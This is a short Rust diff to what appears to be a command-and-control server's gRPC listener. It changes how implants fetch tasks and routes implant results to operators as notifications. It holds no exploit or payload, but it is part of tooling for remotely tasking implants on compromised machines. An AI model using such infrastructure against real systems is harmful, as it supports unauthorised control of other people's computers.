@@ -24,7 +24,7 @@ impl Listener {
             .map_err(|e| Error::FileReadErr("certs/server.key".to_string(), e.to_string()))?;
         let identity = Identity::from_pem(cert, key);
 
-        let service = ImplantService::new(Arc::clone(&db));
+        let service = ImplantService::new(db);
         let tls_config = ServerTlsConfig::new().identity(identity);
         let svc = ImplantRpcServer::new(service);
 
@@ -47,7 +47,7 @@ impl Listener {
 // Define gRPC methods
 struct ImplantService {
     // Let the implants interact with the database
-    db: Arc<Mutex<db::Db>>,
+    db: Arc<Mutex<db::Db>>, // notifications_tx: SyncSender<TaskResult>
 }
 
 impl ImplantService {
@@ -91,7 +91,7 @@ impl ImplantRpc for ImplantService {
             .db
             .lock()
             .await
-            .pop_task(implant_id)
+            .search_task_by_implant(implant_id)
             .ok_or_else(|| Status::unavailable(""))?;
 
         Ok(Response::new(task))
@@ -100,12 +100,23 @@ impl ImplantRpc for ImplantService {
     // Let an implant return the results to the server
     async fn post_result(&self, request: Request<TaskResult>) -> Result<Response<Empty>, Status> {
         let task_result = request.into_inner();
-        if let Ok(stdout) = std::str::from_utf8(&task_result.stdout) {
-            println!("{}", stdout);
-        }
-        if let Ok(stderr) = std::str::from_utf8(&task_result.stderr) {
-            println!("{}", stderr);
-        }
+        // Send the operator the notification
+        let operator_id = self
+            .db
+            .lock()
+            .await
+            .pop_task(task_result.id.clone())
+            .ok_or_else(|| Status::unavailable("Task not found"))?
+            .operator_id
+            .clone();
+
+        self.db
+            .lock()
+            .await
+            .push_notification(operator_id, task_result)
+            .await
+            .map_err(|_| Status::unavailable("No operator associated with task"))?;
+
         Ok(Response::new(Empty {}))
     }
 }
